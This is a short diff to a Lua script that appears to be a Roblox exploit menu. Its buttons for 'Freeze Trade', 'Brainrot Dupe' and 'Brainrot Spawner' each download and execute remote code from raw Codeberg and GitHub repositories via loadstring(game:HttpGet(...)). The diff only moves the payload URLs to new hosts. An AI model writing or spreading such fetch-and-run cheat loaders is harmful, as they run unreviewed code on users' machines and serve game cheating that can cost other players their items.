@@ -154,15 +154,15 @@ end
 
 -- BUTTONS
 createScriptButton("FREEZE TRADE", 0, function()
-	loadstring(game:HttpGet("https://codeberg.org/temporarygit_67/lib/raw/branch/main/ft"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/oskswrs456/library/refs/heads/main/ft"))()
 end)
 
 createScriptButton("Brainrot Dupe", 46, function()
-	loadstring(game:HttpGet("https://codeberg.org/temporarygit_67/lib/raw/branch/main/dupe"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/oskswrs456/library/refs/heads/main/dupe"))()
 end)
 
-createScriptButton("Brainrot Spawner - WIP", 92, function()
-	loadstring(game:HttpGet("https://codeberg.org/temporarygit_67/lib/raw/branch/main/spreadspawner"))()
+createScriptButton("Brainrot Spawner", 92, function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/oskswrs456/library/refs/heads/main/spreadspawnere"))()
 end)
 
 createScriptButton("WIP", 138, function()
